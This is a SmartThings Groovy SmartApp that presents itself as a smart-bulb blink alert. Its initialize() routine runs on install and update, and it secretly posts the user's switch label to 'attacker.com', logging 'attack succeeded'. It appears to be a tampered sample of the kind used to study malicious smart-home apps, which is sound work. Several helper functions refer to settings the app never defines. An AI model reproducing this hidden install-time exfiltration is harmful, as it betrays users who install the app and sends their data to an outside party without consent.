
definition(
    name:"Smart Bulb Alert(Blink/Flash)",
    namespace:"sticks18",
    author:"Scott Gibson",
    description:"Creates a virtual switch button that when turned on will trigger selected smart bulbs to blink or flash",
    category:"My Apps",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png"
)

preferences{
    page(name:"basicInfo")
    page(name:"configureBulbs")
}

def basicInfo(){
    dynamicPage(name:"basicInfo",title:"First,name your trigger and select smart bulb types",nextPage:"configureBulbs",uninstall:true){
        section("Create Virtual Momentary Button as Trigger"){
            input"switchLabel","text",title:"Switch Button Label",multiple:false,required:true
            }
        section("Choose your Smart Bulbs"){
            paragraph"This SmartApp will work with most zigbee bulbs by directly calling the Identify function built into the hardware.This function is generally run when you first pair a bulb to the hub to let you know it was successful.Different bulbs have different capabilities and/or endpoints to address,so they must be selected separately in this SmartApp.If expanded functionality exists for a particular bulb type,you will be given additional options to select.Caveats:Non-Hue bulbs connected to the Hue Bridge,such as GE Link or Cree Connected,will not work because the Hue API is not designed for them.",
            title:"How to select your bulbs...",required:true
            input"geLinks","capability.switch level",title:"Select GE Link Bulbs",required:false,multiple:true
            
            
            
            
            }
        }
}

def configureBulbs(){
    dynamicPage(name:"configureBulbs",title:"Additional Configuration Options by Bulb Type",install:true,uninstall:true){
        section(title:"Auto-off for bulbs directly connected to SmartThings Hub"){
            input"autoOff","bool",title:"Automatically stop the alert",required:false,submitOnChange:true
            input"offDelay","number",title:"Turn off alert after X seconds(default=5,max=10)",required:false,submitOnChange:true
            }
        
        }
}



def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    
    state.autoOff=offDelay
    
    
    
    
    
    def deviceId=app.id+"SimulatedSwitch"
    log.debug(deviceId)
    def existing=getChildDevice(deviceId)
    log.debug existing
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${switchLabel}"
    ]
    ]
    if(!existing){
        log.debug"Add child"
        def childDevice=addChildDevice("sticks18","Smart Bulb Alert Switch",deviceId,null,[label:switchLabel])
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }

}

def uninstalled(){
    removeChildDevices(getChildDevices())
}

private removeChildDevices(delete){
    delete.each{
        deleteChildDevice(it.deviceNetworkId)
        }
}


private hideHueHubBulbs(){
    (hueHubs)?false:true
}

private hideHueDirBulbs(){
    (hueDirs)?false:true
}

private hideOsramBulbs(){
    (osramLs)?false:true
}

private hex(value,width=4){
    def s=new BigInteger(Math.round(value).toString()).toString(16)
    while(s.size()<width){
        s="0"+s
    }
    s
}

private Integer convertHexToInt(hex){
    Integer.parseInt(hex,16)
}

private String swapEndianHex(String hex){
    reverseArray(hex.decodeHex()).encodeHex()
}

private byte[]reverseArray(byte[]array){
    int i=0;
    int j=array.length-1;
    byte tmp;
    while(j>i){
        tmp=array[j];
        array[j]=array[i];
        array[i]=tmp;
        j--;
        i++;
    }
    return array
}



def on(childDevice){
    log.debug"Start alert"
    if(state.autoOff!=null){
        log.debug"Only alert for${state.autoOff}seconds"
        if(geLinks!=null){
            geLinks.each{bulb->
                
                bulb.alert(state.autoOff)
                
                
                }
        }
        
        childDevice.justOff()
    
    }

}

def off(childDevice){
    log.debug"Stop Alert"
}

def allOff(childDevice){
    log.debug"Stopping alerts"
}

